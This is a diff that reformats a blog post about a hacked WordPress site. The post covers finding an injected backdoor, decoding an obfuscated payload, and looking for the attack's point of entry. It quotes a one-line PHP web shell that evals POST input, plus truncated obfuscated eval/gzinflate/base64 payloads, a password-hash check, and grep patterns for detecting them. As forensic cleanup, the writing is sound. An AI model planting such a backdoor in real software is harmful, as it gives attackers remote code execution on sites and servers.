@@ -9,7 +9,7 @@ Over the weekend I was informed by a friend that a site I maintain (not mine
 personally) was showing up in the Google results as being "malicious". While I
 was researching and fixing the problem, I wrote down my thoughts.
 
-* * *
+---
 
 After hearing this news, I Googled the site's name (it is distinctive, but
 shall remain nameless here) and found that it indeed had been flagged by the
@@ -37,8 +37,10 @@ when you need to update them. This is incredibly convenient.
 After I setup the site with Google Webmasters, I found out that the site
 was spewing out things that look like this (of course I renamed the links):
 
-> `downing <a href="http://site.com">prescription tramadol without</a>`
-> `venlafaxine <a href="http://site.com">penegra generic</a>`
+```html
+downing <a href="http://site.com">prescription tramadol without</a>
+venlafaxine <a href="http://site.com">penegra generic</a>
+```
 
 I'm being a little bit of an onscurantist about the sites contents, but suffice to
 say that this is definitely not the appropriate content for this site, and at that point
@@ -53,8 +55,10 @@ Typically, a WordPress hack is found by searching for two PHP functions:
 
 So my initial plan was to search the server for instances of either of those functions using:
 
-	grep -H -r -i 'base64_decode' ~/sitename.com
-	grep -H -r -i 'eval' ~/sitename.com</pre>
+```bash
+grep -H -r -i 'base64_decode' ~/sitename.com
+grep -H -r -i 'eval' ~/sitename.com
+```
 
 * `-H` will print the filename instead of the entire line of text where it found the match
 * `-r` will search recursively
@@ -64,7 +68,9 @@ Doing so brought up quite a few `base64_decode` calls, and many false positives 
 but all of them legitimate. Working with the command line over SSH was difficult, so I
 tarred the entire site's contents:
 
-	tar cvzf backup.tgz ~/sitename.com
+```bash
+tar cvzf backup.tgz ~/sitename.com
+```
 
 Now I have the files in hand, I can very quickly scan through the files and see if
 anything catches my eye, and the very first thing I noticed is the file named `wp_info.php`
@@ -73,7 +79,9 @@ WordPress has a very particular naming scheme with all their files, and it looks
 like this: `word-word.php` So an underscore looks a little suspicious, and opening
 it I find this magical bit:
 
-	`eval(stripslashes(array_pop($_POST)));`
+```php
+eval(stripslashes(array_pop($_POST)));
+```
 
 That command right there will essentially run _anything_ that is thrown at it by a
 POST request. Wow, this is nuts. Also, I don't know why I didn't see it in
@@ -86,41 +94,68 @@ install to compare. After browsing around a bit, I found a file in
 the `wp-content/uploads` folder named `.cache_tofu.php` that I did not
 recognize, and on inspection I found the following at the end of it:
 
-	`preg_replace("/.*/e","x65x76x61x6c ... x3b",".");`
+```php
+preg_replace("/.*/e","x65x76x61x6c ... x3b",".");
+```
 
-Where the dots are I removed about 24,400 characters from the actual thing. I'm not familiar
-with the `preg_replace` function, but the [PHP docs](http://www.php.net/manual/en/function.preg-replace.php)
-say it is basically `preg_replace(pattern,replacement,subject)` so the code above will
-interpret to just the middle part `"x65x76x61x6c ... x3b"`
+Where the dots are I removed about 24,400 characters from the actual thing.
+I'm not familiar with the `preg_replace` function, but the
+[PHP docs](http://www.php.net/manual/en/function.preg-replace.php)
+say it is basically
+
+```php
+preg_replace(pattern,replacement,subject)
+```
+
+so the code above will interpret to just the middle part:
+
+```
+"x65x76x61x6c ... x3b"
+```
 
 But if you'll notice, quite a few characters in that set look like `x##` which is the PHP way of
 noting characters in [extended unicode](http://www.php.net/manual/en/regexp.reference.unicode.php), so
 all you need to do is figure out a way to convert those to normal ASCII and you can read them.
 
-`<sarcasm>`Thankfully`</sarcasm>`, PHP [plays loose](https://maurus.net/resources/programming-languages/php/)
+`<sarcasm>`Thankfully`</sarcasm>`, PHP
+[plays loose](https://maurus.net/resources/programming-languages/php/)
 with the encoding, so we can simply turn it to a string and it will print out. But because
 PHP plays loose, you can't do something as simple as `echo "x65x76x61x6c ... x3b";` because
 it will actually evaluate whatever is there, assuming it's an `eval` statement, which is
 an obvious assumption at this point. So here's what you do:
 
-	$myFile = "testFile.txt";
-	$fh = fopen($myFile, 'w') or die("can't open file");
-	$stringData = "x65x76 ... x20x3b";
-	fwrite($fh, $stringData);
-	fclose($fh);
+```php
+$myFile = "testFile.txt";
+$fh = fopen($myFile, 'w') or die("can't open file");
+$stringData = "x65x76 ... x20x3b";
+fwrite($fh, $stringData);
+fclose($fh);
+```
 
-With that, I finally got what I was looking for: `eval(gzinflate(base64_decode('5b19fxq30jD8...` which
-is the standard hack. And now we can unpack the base64 code to see what magic lies
+With that, I finally got what I was looking for:
+
+```php
+eval(gzinflate(base64_decode('5b19fxq30jD8...
+```
+
+This is the standard hack, so now we can unpack the base64 code to see what magic lies
 beneath. Again, it probably has some `eval` in it, so just write it to the text file.
+
 Because it uses `gzinflate` we need to do it this way in our above code:
-`$stringData = gzinflate(base64_decode('5b19f...` With that, I get a code that is just
-over 1,500 lines long: [pastebin](http://pastebin.com/brR6Jh5f) or [hastebin](http://hastebin.com/hipeqoxoho.php).
 
-On reading the code, my jaw hit the floor.
+```php
+$stringData = gzinflate(base64_decode('5b19f...
+```
 
-I think I need some alcohol to calm my nerves, just a minute...
+With that, I get a code that is just over 1,500 lines long:
+[pastebin](http://pastebin.com/brR6Jh5f)
+or
+[hastebin](http://hastebin.com/hipeqoxoho.php).
 
-* * *
+On reading the code, my jaw hit the floor, and I had to go retrieve
+some alcohol to calm my nerves.
+
+---
 
 Alcohol acquired, still a little shook up, going to press on and hope for the best.
 
@@ -148,7 +183,13 @@ in the WordPress uploads folder, so we can simply navigate to it at
 Hmmmm. The alcohol is setting in a bit now, and I am starting to feel less like the world
 will end, so I am curious what is behind the password?
 
-Looking through the code I find that all it takes is this: `if(md5($_POST['pass']) == 'dcc2630fea8d91fbc38ee0acc48001a6')`
+Looking through the code I find that all it takes is this:
+
+```php
+if (md5($_POST['pass']) == 'dcc2630fea8d91fbc38ee0acc48001a6') {
+	// execute scary code
+}
+```
 
 Although rainbow tables and so on exist, I don't have any of that software setup
 on this computer, so an md5 lookup is not trivial for me. Instead, I boot up the old
@@ -164,16 +205,20 @@ pretty much do what they want.
 
 The question remains, how did the script get there in the first place?
 
-Of course, since I don't run the site I am not sure what plugins were installed
+Of course, since I don't operate the site (I was just called in
+to clean up the mess) I am not sure what plugins were installed
 before, but I am reasonably certain that the people who own the site wouldn't
-install a plugin that didn't come from the [WordPress site](https://wordpress.org/extend/plugins/).
+install a plugin that didn't come from the
+[WordPress site](https://wordpress.org/extend/plugins/).
 
 This limits the possible entry points quite a bit.
 
-One weak point in the WP framework shows up if someone changes the folder permissions of one of the
-folders. This is addressed quite well in [this](https://codex.wordpress.org/Changing_File_Permissions)
-article. But nobody except myself has SSH access, and only one person has FTP access. I'll ask him,
-but he seems reasonably smart so he probably wouldn't set stupid permissions.
+One weak point in the WP framework shows up if someone changes the folder
+permissions of one of the folders. This is addressed quite well in
+[this](https://codex.wordpress.org/Changing_File_Permissions)
+article. But nobody except myself has SSH access, and only one person
+has FTP access. I'll ask him, but he seems reasonably smart so he
+probably wouldn't set stupid permissions.
 
 In fact, I can check whether a file is executable or not using `ls -ls` and I can see that
 it is not executable. Furthermore, the file itself was last modified in May this year
@@ -181,7 +226,7 @@ it is not executable. Furthermore, the file itself was last modified in May this
 is hosted on a [shared server space](https://dreamhost.com/), which could
 even be the problem.
 
-* * *
+---
 
 At this point I am trying to think of solutions. Since all that's run on this server
 is the WordPress install, I can essentially just reinstall the site and verify that
@@ -198,4 +243,5 @@ but I think I'll probably reinstall WordPress, it's a pretty fast experience.
 
 ## Lesson Learned
 
-You should look for the `eval` function, but you should also look for it in Unicode, which looks like `x65x76x61x6c`
+You should look for the `eval` function, but you should also look for it
+in Unicode, which looks like `x65x76x61x6c`
